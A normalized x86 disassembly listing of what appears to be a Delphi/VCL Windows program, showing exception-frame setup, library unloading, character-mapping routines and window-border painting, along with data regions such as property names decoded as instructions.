mov ebp esp
xor eax eax
push ebp
push sub_42f295
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f29c
retn
sub_42f2a9
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
inc edx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
xor bl 0x42
add [ ebx + esi * 8 + 0x540b0042 ] dl
inc ebx
outsd
outsb
jbe r-xdata
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
push sub_42f417
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049f8
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049f8
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f3a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f417
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049f8
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049f8
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f670
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_425b2c
mov [ esi + 0x5 ] al
call sub_42f348
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_42ffe8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_42f6bc
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_42f75c
call sub_42596c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_42f6f0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_42f75c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_42f7a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f6f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42f7f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f6f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42f83c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f6f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42f880
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f6f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42f8c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_42f6f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_42f930
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404808
push eax
mov eax esi
call sub_4047f8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f6f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42f994
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42fa18
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42fa54
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42faf0
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_42fb0d ]
jmp [ eax * 4 + jump_table_42fb76 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42fe7c
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42ffd7
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_42fa18
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42f83c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_412594
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_430004
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43003f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430046
retn
mov eax [ rw-data ]
call sub_40326c
mov eax rw-data
call sub_403fbc
sub_430455
fcom st3
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
and [ edi ] cl
inc ecx
add [ ecx + eax ] ch
[ esi + edi ]
sub_430563
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
push [ eax + 0x3e ]
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
outsd
insb
pushfd
scasb [ edi ]
inc ecx
add [ eax ] ch
add bh bh
mov eax 0xc80043df
fild [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add al 0x46
outsd
outsb
je r-xdata
add bh bh
jo r-xdata
jb r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
adc [ edi ] 0x0
or al 0x46
lea eax [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax + 0x1 ] al
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ edx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
dec [ eax + 0x10043e0 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
adc [ eax ] al
inc ebx
add [ eax - 0x77ffbcc2 ] ah
add [ eax ] eax
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
inc eax
add [ ecx + 0x14ff0000 ] bl
loopne r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
outsb
je r-xdata
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
jmp esp
push 0x6948776f
outsb
add ah bl
fild [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
aad 0x44
add [ eax + eax ] bh
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
je r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
sbb al 0x0
adc [ eax ] al
0x38ff0000 0x43e0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc ebx
add [ ebx ] eax
outsb
je r-xdata
outsb
jne r-xdata
jb r-xdata
adc [ eax ] al
pop ecx
add [ eax ] al
push eax
fild [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
jb r-xdata
outsb
adc [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
test [ bx + 0x43 ] cl
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ edi + 0x6e ]
pop [ ebx ]
jo r-xdata
add [ eax ] dl
inc eax
add [ edi + 0x1 ] ch
add bh bh
add [ edi ] bh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ ecx ] al
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
lodsb [ esi ]
inc [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
inc [ esi + edi + 0x10043 ]
add [ eax ] al
add [ eax ] al
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
add bh bh
test [ esi ] bh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
outsd
arpl [ ebx - 0x30 ] bp
xchg ecx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ edx ] cl
dec edi
nop
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
add [ ebx + ecx + 0x43 ] bl
jb r-xdata
pop [ ebx ]
loopne r-xdata
adc [ ecx ] al
push ebx
je r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
cld
pop [ ebx ]
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax + 0x4f0b002b ] al
dec edi
jbe r-xdata
sbb [ edx + 0x1080043 ] dl
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
push eax
outsd
jo r-xdata
inc ebx
add [ edi + eax * 2 ] cl
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ eax ] bl
inc ecx
inc ebx
add [ ebx + eax * 2 ] ch
inc ebx
add al ch
inc edx
inc ebx
add [ eax + 0x5c004344 ] dh
inc ebx
inc ebx
add [ ebx + eax * 2 ] cl
inc ebx
add al al
inc ebx
inc ebx
add [ esp + eax * 2 ] dl
inc ebx
add [ eax ] cl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
js r-xdata
add [ eax - 0x21 ] bl
inc ebx
add [ ecx ] cl
inc esp
add [ edx + eax + 0x44 ] cl
add [ eax * 2 + 0x45e80044 ] ch
inc esp
add ah ah
inc eax
inc esp
add ah cl
inc ebp
inc esp
add [ edi + eax + 0x44 ] ah
add al bh
or eax 0x1b980044
inc esp
add [ ebp + eax * 2 + 0x43 ] cl
add [ eax ] cl
inc esi
inc ebx
add [ eax + 0x46 ] bh
inc ebx
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add ah ch
sbb al [ eax + eax + 0x1c ]
inc edi
popfd
inc ebx
add al dh
0x34c00041 0x40
inc esp
and [ edx ] al
add [ eax ] al
in al dx
inc esp
jb r-xdata
add bh bh
loopne r-xdata
inc ebp
outsb
add [ ecx ] 0x0
inc [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
adc [ ecx ] al
js r-xdata
popad
jbe r-xdata
dec ebp
outsd
jbe r-xdata
outsb
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x18 ] bp
xchg edx eax
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
jo r-xdata
push ebx
je r-xdata
inc ebx
add [ eax + 0x34004348 ] bh
dec ecx
inc ebx
add ah ch
dec eax
inc ebx
add [ ecx + ecx * 2 ] dl
inc ebx
add [ eax + 0x49 ] dh
inc ebx
add [ eax + 0x1c004349 ] ch
dec eax
inc ebx
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
or eax [ ebx ]
mov cl [ ebx ]
inc ebx
add [ eax ] ah
add al [ eax ]
add ah ch
add [ eax ] al
fmul [ bx + di ]
inc ebx
add [ ebx ] al
or eax 0x69644554
je r-xdata
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
add bh bh
js r-xdata
add [ eax ] al
add al bl
or [ ebx ] eax
or [ ebp + 0x63 ] ah
dec esi
outsd
fcom [ ebx + 0x1000043 ]
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
or al 0x4f
test [ edi + 0xe00043 ] cl
outsb
add [ ecx ] cl
dec edi
xchg edx eax
inc ebx
add [ eax ] cl
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9420845
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
adc [ ecx ] al
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
add al 0x52
inc ebx
imul ebp [ esi + 0x43 ] 0x72746e6f
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x61437261
jae r-xdata
outsb
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
add bh bh
add [ eax ] eax
